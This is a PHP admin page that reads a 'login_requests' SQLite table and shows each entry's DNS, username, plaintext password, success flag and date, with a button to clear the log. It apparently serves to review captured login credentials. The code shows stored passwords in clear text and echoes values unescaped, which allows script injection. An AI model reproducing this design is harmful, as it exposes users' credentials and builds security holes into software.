<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$db = new SQLite3('./api/.db.db');

$res = $db->query('SELECT * FROM login_requests');

include ('includes/header.php');

echo "<div class=\"wrapper\">\n";
echo "<div class=\"main-panel\">\n";
echo "<div class=\"content\">\n";
echo "<div class=\"container-fluid\">\n";
echo "    <div class=\"modal fade\" id=\"confirm-delete\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"myModalLabel\" aria-hidden=\"true\">\n";
echo "        <div class=\"modal-dialog\">\n";
echo "            <div class=\"modal-content\">\n";
echo "                <div class=\"modal-header\">\n";
echo "                    <font color=\"black\"><h2>Confirm</h2></font>\n";
echo "                </div>\n";
echo "                <div class=\"modal-body\">\n";
echo "                    <font color=\"black\">Do you really want to delete?</font>\n";
echo "                </div>\n";
echo "                <div class=\"modal-footer\">\n";
echo "                    <button type=\"button\" class=\"btn btn-default\" data-dismiss=\"modal\">Cancel</button>\n";
echo "                    <a class=\"btn btn-danger btn-ok\">Delete</a>\n";
echo "                </div>\n";
echo "            </div>\n";
echo "        </div>\n";
echo "    </div>\n";
echo "\n";
echo "\n";
?>
<div id="main" style="margin-top: 100px; text-align:left;">
    <h1>Requests Log <button type="button" class="btn btn-warning" id="deleteLogsBtn">Clear</button></h1>
    <table class="table table-dark" style="min-width: 700px;" cellspacing="10" cellpadding="10">
        <tr><td>DNS</td><td>Username</td><td>Password</td><td>Success</td><td>Date Created</td></tr>
        <?php
        $from = 0;
        $limit = 100;
        $query = "SELECT * FROM login_requests ";//  LIMIT $limit OFFSET $from 
        $results = $db->query($query);
        while ($row = $results->fetchArray(SQLITE3_ASSOC)) {
            echo '<tr>';
            echo '<td>'.$row['dns'].'</td>';
            echo '<td>'.$row['username'].'</td>';
            echo '<td>'.$row['password'].'</td>';
            echo '<td>'.(!empty($row['success'])?"Yes":"No").'</td>';
            // echo '<td>'.$row['redirect_url'].'</td>';
            echo '<td>'.date('Y-m-d H:i:s', $row['date_created']).'</td>';
            echo '</tr>';
        }
        ?>
    </table>
</div>
<?
include ('includes/footer.php');
?>
    <script type="text/javascript">
        $(function (){
           $('#deleteLogsBtn').on ('click', function (){
               $.post('ajax/login_requests.php?action=clearlogs', {}).done(function(response){
                   console.log (response.success);
                   if (response.success){
                       location.reload();
                   }
                });
           }); 
        });
    </script>
    </body>
</html>
<?php
$db->close();
?>
